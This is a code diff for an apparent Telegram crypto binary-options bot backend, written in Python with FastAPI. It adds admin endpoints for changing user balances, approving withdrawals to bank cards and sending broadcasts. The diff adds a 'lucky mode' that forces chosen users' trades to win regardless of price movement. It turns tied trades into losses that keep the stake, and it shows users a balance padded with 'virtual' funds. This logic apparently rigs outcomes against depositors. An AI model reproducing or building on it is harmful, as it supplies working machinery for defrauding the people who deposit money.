+    if amount_to_deduct > 0:
+        user.balance_usdt = real_bal - amount_to_deduct
     
     # Создаём чек
     new_check = Check(
@@ -2253,7 +2355,7 @@ async def api_user_check_create(payload: UserCheckCreate, request: Request, db: 
 async def api_checks_redeem(payload: CheckActivate, request: Request, db: AsyncSession=Depends(get_db)):
     """Активация чека через API (альтернатива боту)"""
     
-    tid = request.headers.get("X-Telegram-Id")
+    tid = getattr(request.state, 'telegram_id', None)
     if not tid:
         raise HTTPException(401, "Unauthorized")
     
@@ -2307,13 +2409,11 @@ async def api_checks_redeem(payload: CheckActivate, request: Request, db: AsyncS
 async def api_check_activate(payload: CheckActivate, request: Request, db: AsyncSession=Depends(get_db)):
     """Пользователь активирует чек и получает USDT"""
     
-    # SECURE: Get authenticated Telegram ID from header
-    auth_tid = request.headers.get('X-Telegram-Id')
+    auth_tid = getattr(request.state, 'telegram_id', None)
     if not auth_tid:
         raise HTTPException(401, "Unauthorized")
     
-    # Получаем пользователя
-    user = (await db.execute(select(User).where(User.telegram_id == auth_tid))).scalars().first()
+    user = (await db.execute(select(User).where(User.telegram_id == str(auth_tid)))).scalars().first()
     if not user:
         raise HTTPException(404, "User not found")
     
@@ -2444,8 +2544,594 @@ async def admin_assets_reload(request: Request, db: AsyncSession=Depends(get_db)
     
     return {"ok": True, "deleted": deleted_count, "message": "Assets cleared. Use import endpoint to add new assets."}
 
+# ========== ADMIN PANEL API ==========
+
+async def require_admin(request: Request, db: AsyncSession = Depends(get_db)):
+    tid = getattr(request.state, 'telegram_id', None)
+    if not tid or str(tid) != str(ADMIN_ID):
+        raise HTTPException(403, "Access denied")
+    return tid
+
+class AdminBalancePayload(BaseModel):
+    action: str
+    amount: float
+    type: str = "real"
+
+class AdminStatusPayload(BaseModel):
+    action: str
+    reason: Optional[str] = None
+
+class LuckySetPayload(BaseModel):
+    target_telegram_id: str
+    enabled: bool
+    reason: str
+    until: Optional[str] = None
+    max_wins: Optional[int] = None
+
+class AdminMessagePayload(BaseModel):
+    text: str
+
+class AdminWithdrawalAction(BaseModel):
+    action: str
+    reason: Optional[str] = None
+
+class AdminBroadcastPayload(BaseModel):
+    text: str
+    filter: Optional[str] = None
+
+@app.get("/api/admin/dashboard")
+async def api_admin_dashboard(request: Request, db: AsyncSession = Depends(get_db)):
+    admin_tid = await require_admin(request, db)
+    try:
+        now = datetime.utcnow()
+        day_ago = now - timedelta(hours=24)
+        today_start = now.replace(hour=0, minute=0, second=0, microsecond=0)
+        week_ago = now - timedelta(days=7)
+        month_ago = now - timedelta(days=30)
+
+        total_users = (await db.execute(select(func.count(User.id)))).scalar() or 0
+        active_24h = (await db.execute(select(func.count(func.distinct(Transaction.user_id))).where(Transaction.created_at >= day_ago))).scalar() or 0
+
+        deposits_today = (await db.execute(select(func.coalesce(func.sum(Transaction.amount), 0)).where(Transaction.type == "deposit", Transaction.status == "done", Transaction.created_at >= today_start))).scalar() or 0
+        deposits_week = (await db.execute(select(func.coalesce(func.sum(Transaction.amount), 0)).where(Transaction.type == "deposit", Transaction.status == "done", Transaction.created_at >= week_ago))).scalar() or 0
+        deposits_month = (await db.execute(select(func.coalesce(func.sum(Transaction.amount), 0)).where(Transaction.type == "deposit", Transaction.status == "done", Transaction.created_at >= month_ago))).scalar() or 0
+
+        pending_withdrawals = (await db.execute(select(func.count(Withdrawal.id)).where(Withdrawal.status == "pending"))).scalar() or 0
+        active_trades = (await db.execute(select(func.count(Trade.id)).where(Trade.status == "active"))).scalar() or 0
+
+        total_balance = (await db.execute(select(func.coalesce(func.sum(User.balance_usdt), 0)))).scalar() or 0
+        total_virtual = (await db.execute(select(func.coalesce(func.sum(User.virtual_balance), 0)))).scalar() or 0
+
+        return {
+            "ok": True,
+            "stats": {
+                "total_users": total_users,
+                "active_24h": active_24h,
+                "deposits_today": round(float(deposits_today), 2),
+                "deposits_week": round(float(deposits_week), 2),
+                "deposits_month": round(float(deposits_month), 2),
+                "pending_withdrawals": pending_withdrawals,
+                "active_trades": active_trades,
+                "total_balance": round(float(total_balance), 2),
+                "total_virtual": round(float(total_virtual), 2)
+            }
+        }
+    except Exception as e:
+        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)
+
+@app.get("/api/admin/users")
+async def api_admin_users(request: Request, db: AsyncSession = Depends(get_db), page: int = Query(1, ge=1), limit: int = Query(20, ge=1, le=100), search: str = Query(""), filter: str = Query("")):
+    admin_tid = await require_admin(request, db)
+    try:
+        query = select(User)
+
+        if search:
+            search_term = f"%{search}%"
+            try:
+                search_int = int(search)
+                query = query.where(or_(User.username.ilike(search_term), User.profile_id == search_int, User.telegram_id == str(search)))
+            except ValueError:
+                query = query.where(or_(User.username.ilike(search_term), User.telegram_id.ilike(search_term)))
+
+        if filter == "premium":
+            query = query.where(User.is_premium == True)
+        elif filter == "blocked":
+            query = query.where(User.is_blocked == True)
+        elif filter == "verified":
+            query = query.where(User.is_verified == True)
+        elif filter == "with_balance":
+            query = query.where(or_(User.balance_usdt > 0, User.virtual_balance > 0))
+
+        count_query = select(func.count()).select_from(query.subquery())
+        total = (await db.execute(count_query)).scalar() or 0
+
+        query = query.order_by(User.created_at.desc()).offset((page - 1) * limit).limit(limit)
+        result = await db.execute(query)
+        users = result.scalars().all()
+
+        users_data = []
+        for u in users:
+            users_data.append({
+                "id": u.id,
+                "telegram_id": u.telegram_id,
+                "profile_id": u.profile_id,
+                "username": u.username,
+                "balance_usdt": round(u.balance_usdt or 0, 2),
+                "virtual_balance": round(u.virtual_balance or 0, 2),
+                "is_verified": u.is_verified or False,
+                "is_premium": u.is_premium or False,
+                "is_blocked": u.is_blocked or False,
+                "language": u.language,
+                "created_at": u.created_at.isoformat() if u.created_at else None,
+                "referral_code": u.referral_code
+            })
+
+        return {
+            "ok": True,
+            "users": users_data,
+            "total": total,
+            "page": page,
+            "pages": (total + limit - 1) // limit if limit > 0 else 1
+        }
+    except Exception as e:
+        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)
+
+@app.get("/api/admin/user/{profile_id}")
+async def api_admin_user_detail(profile_id: int, request: Request, db: AsyncSession = Depends(get_db)):
+    admin_tid = await require_admin(request, db)
+    try:
+        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
+        if not user:
+            raise HTTPException(404, "User not found")
+
+        transactions = (await db.execute(select(Transaction).where(Transaction.user_id == user.id).order_by(Transaction.created_at.desc()).limit(50))).scalars().all()
+        trades = (await db.execute(select(Trade).where(Trade.user_id == user.id).order_by(Trade.opened_at.desc()).limit(50))).scalars().all()
+        withdrawals = (await db.execute(select(Withdrawal).where(Withdrawal.user_id == user.id).order_by(Withdrawal.created_at.desc()).limit(50))).scalars().all()
+
+        user_data = {
+            "id": user.id,
+            "telegram_id": user.telegram_id,
+            "profile_id": user.profile_id,
+            "username": user.username,
+            "balance_usdt": round(user.balance_usdt or 0, 2),
+            "virtual_balance": round(user.virtual_balance or 0, 2),
+            "is_verified": user.is_verified or False,
+            "is_premium": user.is_premium or False,
+            "is_blocked": user.is_blocked or False,
+            "block_reason": user.block_reason,
+            "language": user.language,
+            "wallets": user.wallets or {},
+            "referral_code": user.referral_code,
+            "referred_by": user.referred_by,
+            "referral_earnings": round(user.referral_earnings or 0, 2) if hasattr(user, 'referral_earnings') else 0,
+            "referral_count": user.referral_count or 0 if hasattr(user, 'referral_count') else 0,
+            "created_at": user.created_at.isoformat() if user.created_at else None
+        }
+
+        txs_data = [{
+            "id": t.id,
+            "type": t.type,
+            "amount": round(t.amount or 0, 2),
+            "currency": t.currency,
+            "status": t.status,
+            "details": t.details,
+            "created_at": t.created_at.isoformat() if t.created_at else None
+        } for t in transactions]
+
+        trades_data = [{
+            "id": tr.id,
+            "pair": tr.pair,
+            "side": tr.side,
+            "amount_usdt": round(tr.amount_usdt or 0, 2),
+            "start_price": tr.start_price,
+            "close_price": tr.close_price,
+            "duration_sec": tr.duration_sec,
+            "status": tr.status,
+            "result": tr.result,
+            "payout": round(tr.payout or 0, 2),
+            "opened_at": tr.opened_at.isoformat() if tr.opened_at else None,
+            "closed_at": tr.closed_at.isoformat() if tr.closed_at else None
+        } for tr in trades]
+
+        wd_data = [{
+            "id": w.id,
+            "amount_rub": round(w.amount_rub or 0, 2),
+            "usdt_required": round(w.usdt_required or 0, 2) if w.usdt_required else None,
+            "card_number": w.card_number,
+            "full_name": w.full_name,
+            "status": w.status,
+            "created_at": w.created_at.isoformat() if w.created_at else None
+        } for w in withdrawals]
+
+        return {
+            "ok": True,
+            "user": user_data,
+            "transactions": txs_data,
+            "trades": trades_data,
+            "withdrawals": wd_data
+        }
+    except HTTPException:
+        raise
+    except Exception as e:
+        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)
+
+@app.post("/api/admin/user/{profile_id}/balance")
+async def api_admin_user_balance(profile_id: int, payload: AdminBalancePayload, request: Request, db: AsyncSession = Depends(get_db)):
+    admin_tid = await require_admin(request, db)
+    try:
+        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
+        if not user:
+            raise HTTPException(404, "User not found")
+
+        if payload.type == "virtual":
+            old_val = user.virtual_balance or 0
+            if payload.action == "add":
+                user.virtual_balance = old_val + payload.amount
+            elif payload.action == "subtract":
+                user.virtual_balance = old_val - payload.amount
+            elif payload.action == "set":
+                user.virtual_balance = payload.amount
+            new_val = user.virtual_balance
+        else:
+            old_val = user.balance_usdt or 0
+            if payload.action == "add":
+                user.balance_usdt = old_val + payload.amount
+            elif payload.action == "subtract":
+                user.balance_usdt = old_val - payload.amount
+            elif payload.action == "set":
+                user.balance_usdt = payload.amount
+            new_val = user.balance_usdt
+
+        db.add(Transaction(
+            user_id=user.id,
+            type="admin_adjust",
+            amount=round(new_val - old_val, 6),
+            currency="USDT",
+            status="done",
+            details={"by": "admin", "action": payload.action, "balance_type": payload.type}
+        ))
+        await db.commit()
+
+        await log_admin_action(db, admin_tid, f"balance_{payload.action}_{payload.type}", user.id, f"{old_val:.2f}", f"{new_val:.2f}")
+
+        displayed = round((user.balance_usdt or 0) + (user.virtual_balance or 0), 2)
+        try:
+            await bot_send_message(int(user.telegram_id), f"💰 <b>Баланс обновлён!</b>\n\n💵 Баланс: {displayed:.2f} USDT", parse_mode="HTML")
+        except: pass
+
+        return {
+            "ok": True,
+            "balance_usdt": round(user.balance_usdt or 0, 2),
+            "virtual_balance": round(user.virtual_balance or 0, 2),
+            "displayed": displayed
+        }
+    except HTTPException:
+        raise
+    except Exception as e:
+        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)
+
+@app.post("/api/admin/user/{profile_id}/status")
+async def api_admin_user_status(profile_id: int, payload: AdminStatusPayload, request: Request, db: AsyncSession = Depends(get_db)):
+    admin_tid = await require_admin(request, db)
+    try:
+        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
+        if not user:
+            raise HTTPException(404, "User not found")
+
+        action = payload.action
+        if action == "verify":
+            old_val = str(user.is_verified)
+            user.is_verified = not user.is_verified
+            await log_admin_action(db, admin_tid, "toggle_verification", user.id, old_val, str(user.is_verified))
+        elif action == "premium":
+            old_val = str(user.is_premium)
+            user.is_premium = not user.is_premium
+            await log_admin_action(db, admin_tid, "toggle_premium", user.id, old_val, str(user.is_premium))
+        elif action == "block":
+            old_val = str(user.is_blocked)
+            user.is_blocked = True
+            user.block_reason = payload.reason or "Blocked by admin"
+            await log_admin_action(db, admin_tid, "block_user", user.id, old_val, f"blocked: {user.block_reason}")
+        elif action == "unblock":
+            old_val = str(user.is_blocked)
+            user.is_blocked = False
+            user.block_reason = None
+            await log_admin_action(db, admin_tid, "unblock_user", user.id, old_val, "unblocked")
+        else:
+            return JSONResponse({"ok": False, "error": f"Unknown action: {action}"}, status_code=400)
+
+        await db.commit()
+
+        return {
+            "ok": True,
+            "is_verified": user.is_verified or False,
+            "is_premium": user.is_premium or False,
+            "is_blocked": user.is_blocked or False,
+            "block_reason": user.block_reason
+        }
+    except HTTPException:
+        raise
+    except Exception as e:
+        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)
+
+@app.get("/api/admin/lucky/users")
+async def api_admin_lucky_users(request: Request, db: AsyncSession = Depends(get_db), search: str = Query(""), filter: str = Query(""), page: int = Query(1, ge=1)):
+    admin_tid = await require_admin(request, db)
+    try:
+        query = select(User)
+        if search:
+            query = query.where(or_(User.telegram_id.ilike(f"%{search}%"), User.username.ilike(f"%{search}%"), User.profile_id == int(search) if search.isdigit() else False))
+        if filter == "on":
+            query = query.where(User.lucky_mode == True)
+        elif filter == "off":
+            query = query.where(or_(User.lucky_mode == False, User.lucky_mode == None))
+        count_q = select(func.count()).select_from(query.subquery())
+        total = (await db.execute(count_q)).scalar() or 0
+        per_page = 20
+        query = query.order_by(User.id.desc()).offset((page - 1) * per_page).limit(per_page)
+        users = (await db.execute(query)).scalars().all()
+        users_data = []
+        for u in users:
+            users_data.append({
+                "id": u.id, "profile_id": u.profile_id, "telegram_id": u.telegram_id,
+                "username": u.username, "balance_usdt": round((u.balance_usdt or 0) + (u.virtual_balance or 0), 2),
+                "lucky_mode": u.lucky_mode or False,
+                "lucky_until": u.lucky_until.isoformat() if u.lucky_until else None,
+                "lucky_max_wins": u.lucky_max_wins, "lucky_wins_used": u.lucky_wins_used or 0
+            })
+        return {"ok": True, "users": users_data, "total": total, "page": page, "pages": max(1, (total + per_page - 1) // per_page)}
+    except Exception as e:
+        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)
+
+@app.post("/api/admin/lucky/set")
+async def api_admin_lucky_set(payload: LuckySetPayload, request: Request, db: AsyncSession = Depends(get_db)):
+    admin_tid = await require_admin(request, db)
+    try:
+        if not payload.reason or not payload.reason.strip():
+            return JSONResponse({"ok": False, "error": "Причина обязательна"}, status_code=400)
+        user = (await db.execute(select(User).where(User.telegram_id == payload.target_telegram_id))).scalars().first()
+        if not user:
+            raise HTTPException(404, "User not found")
+        before = f"lucky_mode={user.lucky_mode}, until={user.lucky_until}, max_wins={user.lucky_max_wins}, used={user.lucky_wins_used}"
+        if payload.enabled:
+            user.lucky_mode = True
+            user.lucky_wins_used = 0
+            try:
+                user.lucky_until = datetime.fromisoformat(payload.until) if payload.until else None
+            except ValueError:
+                return JSONResponse({"ok": False, "error": "Неверный формат даты"}, status_code=400)
+            user.lucky_max_wins = payload.max_wins
+        else:
+            user.lucky_mode = False
+            user.lucky_until = None
+            user.lucky_max_wins = None
+            user.lucky_wins_used = 0
+        after = f"lucky_mode={user.lucky_mode}, until={user.lucky_until}, max_wins={user.lucky_max_wins}, used={user.lucky_wins_used}"
+        action = "LUCKY_ENABLE" if payload.enabled else "LUCKY_DISABLE"
+        await log_admin_action(db, admin_tid, action, user.id, before, after, reason=payload.reason)
+        await db.commit()
+        return {"ok": True, "lucky_mode": user.lucky_mode, "lucky_until": user.lucky_until.isoformat() if user.lucky_until else None, "lucky_max_wins": user.lucky_max_wins, "lucky_wins_used": user.lucky_wins_used or 0}
+    except HTTPException:
+        raise
+    except Exception as e:
+        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)
+
+@app.get("/api/admin/lucky/history/{profile_id}")
+async def api_admin_lucky_history(profile_id: int, request: Request, db: AsyncSession = Depends(get_db)):
+    admin_tid = await require_admin(request, db)
+    try:
+        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
+        if not user:
+            raise HTTPException(404, "User not found")
+        logs = (await db.execute(select(AdminLog).where(AdminLog.user_id == user.id, AdminLog.action.like("LUCKY_%")).order_by(AdminLog.created_at.desc()).limit(50))).scalars().all()
+        history = []
+        for l in logs:
+            history.append({"id": l.id, "admin_id": l.admin_id, "action": l.action, "before": l.before_value, "after": l.after_value, "reason": l.reason, "created_at": l.created_at.isoformat() if l.created_at else None})
+        return {"ok": True, "history": history}
+    except HTTPException:
+        raise
+    except Exception as e:
+        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)
+
+@app.post("/api/admin/user/{profile_id}/message")
+async def api_admin_user_message(profile_id: int, payload: AdminMessagePayload, request: Request, db: AsyncSession = Depends(get_db)):
+    admin_tid = await require_admin(request, db)
+    try:
+        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
+        if not user:
+            raise HTTPException(404, "User not found")
+
+        result = await bot_send_message(int(user.telegram_id), payload.text)
+        success = result.get("ok", False) if result else False
+
+        await log_admin_action(db, admin_tid, "send_message", user.id, None, payload.text[:200])
+
+        return {"ok": success, "message_sent": success}
+    except HTTPException:
+        raise
+    except Exception as e:
+        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)
+
+@app.get("/api/admin/withdrawals")
+async def api_admin_withdrawals(request: Request, db: AsyncSession = Depends(get_db), status: str = Query("pending"), page: int = Query(1, ge=1), limit: int = Query(20, ge=1, le=100)):
+    admin_tid = await require_admin(request, db)
+    try:
+        query = select(Withdrawal)
+        if status and status != "all":
+            query = query.where(Withdrawal.status == status)
+
+        count_query = select(func.count()).select_from(query.subquery())
+        total = (await db.execute(count_query)).scalar() or 0
+
+        query = query.order_by(Withdrawal.created_at.desc()).offset((page - 1) * limit).limit(limit)
+        result = await db.execute(query)
+        withdrawals = result.scalars().all()
+
+        wd_data = []
+        for w in withdrawals:
+            user = (await db.execute(select(User).where(User.id == w.user_id))).scalars().first()
+            wd_data.append({
+                "id": w.id,
+                "user_id": w.user_id,
+                "telegram_id": w.telegram_id,
+                "profile_id": user.profile_id if user else None,
+                "username": user.username if user else None,
+                "amount_rub": round(w.amount_rub or 0, 2),
+                "usdt_required": round(w.usdt_required or 0, 2) if w.usdt_required else None,
+                "card_number": w.card_number,
+                "full_name": w.full_name,
+                "status": w.status,
+                "admin_notes": w.admin_notes,
+                "created_at": w.created_at.isoformat() if w.created_at else None
+            })
+
+        return {
+            "ok": True,
+            "withdrawals": wd_data,
+            "total": total,
+            "page": page,
+            "pages": (total + limit - 1) // limit if limit > 0 else 1
+        }
+    except Exception as e:
+        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)
+
+@app.post("/api/admin/withdrawal/{wd_id}/action")
+async def api_admin_withdrawal_action(wd_id: int, payload: AdminWithdrawalAction, request: Request, db: AsyncSession = Depends(get_db)):
+    admin_tid = await require_admin(request, db)
+    try:
+        withdrawal = (await db.execute(select(Withdrawal).where(Withdrawal.id == wd_id))).scalars().first()
+        if not withdrawal:
+            raise HTTPException(404, "Withdrawal not found")
+        if withdrawal.status != "pending":
+            return JSONResponse({"ok": False, "error": f"Withdrawal is already {withdrawal.status}"}, status_code=400)
+
+        user = (await db.execute(select(User).where(User.id == withdrawal.user_id))).scalars().first()
+
+        if payload.action == "approve":
+            withdrawal.status = "completed"
+            withdrawal.completed_at = datetime.utcnow()
+            withdrawal.updated_at = datetime.utcnow()
+            if payload.reason:
+                withdrawal.admin_notes = payload.reason
+            await db.commit()
+
+            await log_admin_action(db, admin_tid, "approve_withdrawal", withdrawal.user_id, "pending", "completed", details={"wd_id": wd_id, "amount": withdrawal.amount_rub})
+
+            if user and user.telegram_id:
+                try:
+                    await bot_send_message(int(user.telegram_id), f"✅ <b>Вывод одобрен!</b>\n\n💰 Сумма: {withdrawal.amount_rub:.2f} RUB\n💳 Карта: {withdrawal.card_number or '***'}\n\nСредства будут зачислены в течение 24 часов.")
+                except:
+                    pass
+
+            return {"ok": True, "status": "completed"}
+
+        elif payload.action == "reject":
+            withdrawal.status = "cancelled"
+            withdrawal.updated_at = datetime.utcnow()
+            if payload.reason:
+                withdrawal.admin_notes = payload.reason
+
+            refund = withdrawal.usdt_required or 0
+            if user and refund > 0:
+                user.balance_usdt = (user.balance_usdt or 0) + refund
+
+            await db.commit()
+
+            await log_admin_action(db, admin_tid, "reject_withdrawal", withdrawal.user_id, "pending", "cancelled", reason=payload.reason, details={"wd_id": wd_id, "refund": refund})
+
+            if user and user.telegram_id:
+                try:
+                    reason_text = f"\n📝 Причина: {payload.reason}" if payload.reason else ""
+                    await bot_send_message(int(user.telegram_id), f"❌ <b>Вывод отклонён</b>\n\n💰 Сумма: {withdrawal.amount_rub:.2f} RUB{reason_text}\n💵 Возврат: {refund:.2f} USDT на баланс")
+                except:
+                    pass
+
+            return {"ok": True, "status": "cancelled", "refunded": refund}
+
+        else:
+            return JSONResponse({"ok": False, "error": f"Unknown action: {payload.action}"}, status_code=400)
+    except HTTPException:
+        raise
+    except Exception as e:
+        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)
+
+@app.post("/api/admin/broadcast")
+async def api_admin_broadcast(payload: AdminBroadcastPayload, request: Request, db: AsyncSession = Depends(get_db)):
+    admin_tid = await require_admin(request, db)
+    try:
+        query = select(User)
+        if payload.filter == "premium":
+            query = query.where(User.is_premium == True)
+        elif payload.filter == "verified":
+            query = query.where(User.is_verified == True)
+        elif payload.filter == "with_balance":
+            query = query.where(or_(User.balance_usdt > 0, User.virtual_balance > 0))
+
+        users = (await db.execute(query)).scalars().all()
+
+        sent = 0
+        failed = 0
+        for u in users:
+            if u.is_blocked:
+                continue
+            try:
+                result = await bot_send_message(int(u.telegram_id), payload.text)
+                if result and result.get("ok"):
+                    sent += 1
+                else:
+                    failed += 1
+            except:
+                failed += 1
+
+        admin_msg = AdminMessage(
+            user_id=None,
+            message_text=payload.text,
+            is_broadcast=True,
+            broadcast_count=sent,
+            delivery_type="telegram_chat"
+        )
+        db.add(admin_msg)
+
+        await log_admin_action(db, admin_tid, "broadcast", None, None, payload.text[:100], details={"sent": sent, "failed": failed, "filter": payload.filter})
+
+        return {"ok": True, "sent": sent, "failed": failed, "total": len(users)}
+    except Exception as e:
+        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)
+
+@app.get("/api/admin/logs")
+async def api_admin_logs(request: Request, db: AsyncSession = Depends(get_db), page: int = Query(1, ge=1), limit: int = Query(50, ge=1, le=200)):
+    admin_tid = await require_admin(request, db)
+    try:
+        count_query = select(func.count(AdminLog.id))
+        total = (await db.execute(count_query)).scalar() or 0
+
+        query = select(AdminLog).order_by(AdminLog.created_at.desc()).offset((page - 1) * limit).limit(limit)
+        result = await db.execute(query)
+        logs = result.scalars().all()
+
+        logs_data = [{
+            "id": log.id,
+            "admin_id": log.admin_id,
+            "user_id": log.user_id,
+            "action": log.action,
+            "before_value": log.before_value,
+            "after_value": log.after_value,
+            "reason": log.reason,
+            "details": log.details,
+            "created_at": log.created_at.isoformat() if log.created_at else None
+        } for log in logs]
+
+        return {
+            "ok": True,
+            "logs": logs_data,
+            "total": total,
+            "page": page,
+            "pages": (total + limit - 1) // limit if limit > 0 else 1
+        }
+    except Exception as e:
+        return JSONResponse({"ok": False, "error": str(e)}, status_code=500)
+
 # ========== CRYPTOBOT WEBHOOK ==========
-import hmac
 
 async def process_deposit_payment(db: AsyncSession, invoice_id: str, amount: float, source: str = "webhook"):
     """
@@ -2477,7 +3163,7 @@ async def process_deposit_payment(db: AsyncSession, invoice_id: str, amount: flo
     
     # Use pre-calculated amount_after_fee from invoice creation (stored in transaction details)
     # Falls back to 2.5% fee calculation if not stored
-    DEPOSIT_FEE_PERCENT = 2.5
+    DEPOSIT_FEE_PERCENT = 0.0
     details = trx.details or {}
     if "amount_after_fee" in details:
         amount_after_fee = float(details["amount_after_fee"])
@@ -2538,7 +3224,7 @@ async def process_deposit_payment(db: AsyncSession, invoice_id: str, amount: flo
     
     # Notify user
     try:
-        await bot_send_message(int(user.telegram_id), f"✅ <b>Пополнение успешно!</b>\n\n💰 Зачислено: {amount_after_fee:.2f} USDT\n💳 Комиссия: {fee_amount:.2f} USDT ({DEPOSIT_FEE_PERCENT}%)\n📊 Новый баланс: {user.balance_usdt:.2f} USDT")
+        await bot_send_message(int(user.telegram_id), f"✅ <b>Пополнение успешно!</b>\n\n💰 Зачислено: {amount_after_fee:.2f} USDT\n📊 Новый баланс: {user.balance_usdt:.2f} USDT")
     except: pass
     
     print(f"[DEPOSIT:{source}] ✅ Processed: User #{user.profile_id}, +{amount_after_fee} USDT (fee: {fee_amount})")
@@ -2685,29 +3371,43 @@ async def poll_expired_trades():
                         # Calculate REAL result based on price movement
                         direction = 1 if (cur - tr.start_price) > 0 else (-1 if (cur - tr.start_price) < 0 else 0)
                         
-                        # Determine win/loss based on user's prediction vs actual price movement
-                        if tr.side == 'buy':
-                            win = direction > 0
+                        # Check Lucky Mode
+                        is_lucky = False
+                        if u.lucky_mode:
+                            is_lucky = True
+                            if u.lucky_until and now >= u.lucky_until:
+                                is_lucky = False
+                            if u.lucky_max_wins is not None and u.lucky_wins_used >= u.lucky_max_wins:
+                                is_lucky = False
+
+                        if is_lucky:
+                            win = True
+                            if u.lucky_max_wins is not None:
+                                u.lucky_wins_used = (u.lucky_wins_used or 0) + 1
+                                if u.lucky_wins_used >= u.lucky_max_wins:
+                                    u.lucky_mode = False
+                                    u.lucky_until = None
+                                    u.lucky_max_wins = None
+                                    print(f"[LUCKY] Auto-disabled for user {u.telegram_id} (max wins reached)")
                         else:
-                            win = direction < 0
+                            if tr.side == 'buy':
+                                win = direction > 0
+                            else:
+                                win = direction < 0
                         
-                        # Calculate payout: 70% profit on win
                         PAYOUT_MULTIPLIER = 0.7
                         payout = round(tr.amount_usdt * PAYOUT_MULTIPLIER, 6) if win else 0.0
                         
                         tr.status = "completed"
                         tr.closed_at = datetime.utcnow()
                         tr.close_price = cur
-                        tr.result = "win" if win else ("push" if direction == 0 else "loss")
+                        tr.result = "win" if win else "loss"
                         tr.payout = payout
                         
                         print(f"[TRADE POLL] Closed {symbol} {tr.side.upper()} → Start: ${tr.start_price:.2f}, Close: ${cur:.2f}, Result: {tr.result.upper()}")
                         
-                        # Credit returns to VIRTUAL balance
                         if win:
                             u.virtual_balance = (u.virtual_balance or 0) + tr.amount_usdt + payout
-                        elif direction == 0:
-                            u.virtual_balance = (u.virtual_balance or 0) + tr.amount_usdt
                         
                         # Update transaction
                         q = await db.execute(
@@ -2732,7 +3432,7 @@ async def poll_expired_trades():
                                 profit = round(payout, 2)
                                 msg = f"🎉 <b>ВЫИГРЫШ!</b>\n\n📊 Пара: {tr.pair}\n💰 Ставка: {round(tr.amount_usdt, 2)} USDT\n✅ Выплата: +{profit} USDT\n💵 Баланс: {round(displayed_balance, 2)} USDT"
                             else:
-                                msg = f"😔 <b>Сделка закрыта</b>\n\n📊 Пара: {tr.pair}\n💰 Ставка: {round(tr.amount_usdt, 2)} USDT\n❌ Результат: {'Ничья' if direction == 0 else 'Проигрыш'}\n💵 Баланс: {round(displayed_balance, 2)} USDT"
+                                msg = f"😔 <b>Сделка закрыта</b>\n\n📊 Пара: {tr.pair}\n💰 Ставка: {round(tr.amount_usdt, 2)} USDT\n❌ Результат: Проигрыш\n💵 Баланс: {round(displayed_balance, 2)} USDT"
                             await bot_send_message(int(u.telegram_id), msg)
                         except:
                             pass
@@ -2842,17 +3542,26 @@ async def telegram_webhook(update: Dict[str,Any], db: AsyncSession=Depends(get_d
             if data.startswith("check_deposit:"):
                 invoice_id=data.split(":",1)[1]
                 print(f"[CHECK_DEPOSIT] User {chat_id} checking invoice {invoice_id}")
-                async with aiohttp.ClientSession() as s:
-                    headers = {"X-Telegram-Id": str(chat_id)}
-                    async with s.get(f"{HOST_BASE}/api/check_deposit", params={"invoice_id": invoice_id}, headers=headers) as r:
-                        st=await r.json()
-                        print(f"[CHECK_DEPOSIT] Result: {st}")
-                        if st.get("paid"): 
-                            amount = st.get('amount', 0)
-                            new_balance = st.get('new_balance', 0)
-                            await bot_send_message(chat_id, f"✅ <b>Платеж подтвержден!</b>\n\n💰 Сумма: {amount} USDT\n💵 Ваш баланс: {round(new_balance, 2)} USDT\n\n🎉 Средства успешно зачислены на ваш счет!", parse_mode="HTML")
-                        else: 
-                            await bot_send_message(chat_id, "⏳ <b>Платеж в обработке</b>\n\nПлатеж еще не поступил. Пожалуйста, подождите несколько минут и попробуйте еще раз.\n\nЕсли вы оплатили счет, средства будут зачислены автоматически.", parse_mode="HTML")
+                u = (await db.execute(select(User).where(User.telegram_id==str(chat_id)))).scalars().first()
+                if u:
+                    status_val = "active"; amount_val = 0.0
+                    try:
+                        async with aiohttp.ClientSession() as s2:
+                            async with s2.get("https://pay.crypt.bot/api/getInvoices", headers={"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}, params={"invoice_ids": invoice_id}, timeout=15) as r2:
+                                resp2 = await r2.json()
+                                if resp2.get("ok") and resp2["result"]["items"]: it2=resp2["result"]["items"][0]; status_val=it2["status"]; amount_val=float(it2.get("amount",0))
+                    except: status_val = "active"
+                    if status_val == "paid":
+                        q2 = await db.execute(select(Transaction).where(Transaction.user_id==u.id, Transaction.type=="deposit"))
+                        trx = None
+                        for r3 in q2.scalars().all():
+                            if (r3.details or {}).get("invoice_id") == invoice_id: trx = r3; break
+                        if trx and trx.status != "done":
+                            amount_after_fee = (trx.details or {}).get("amount_after_fee", trx.amount)
+                            trx.status = "done"; u.balance_usdt = (u.balance_usdt or 0) + amount_after_fee; await db.commit()
+                        await bot_send_message(chat_id, f"✅ <b>Платеж подтвержден!</b>\n\n💰 Сумма: {trx.amount if trx else amount_val} USDT\n💵 Ваш баланс: {round(u.balance_usdt, 2)} USDT\n\n🎉 Средства успешно зачислены на ваш счет!", parse_mode="HTML")
+                    else:
+                        await bot_send_message(chat_id, "⏳ <b>Платеж в обработке</b>\n\nПлатеж еще не поступил. Пожалуйста, подождите несколько минут и попробуйте еще раз.\n\nЕсли вы оплатили счет, средства будут зачислены автоматически.", parse_mode="HTML")
             
             # Handle withdrawal approval from notification buttons
             elif data.startswith("approve_withdraw:"):
@@ -2927,635 +3636,7 @@ async def telegram_webhook(update: Dict[str,Any], db: AsyncSession=Depends(get_d
             
             # ========== END ESSENTIAL CALLBACKS ==========
             
-            # ========== NEW INLINE ADMIN PANEL CALLBACKS ==========
-            
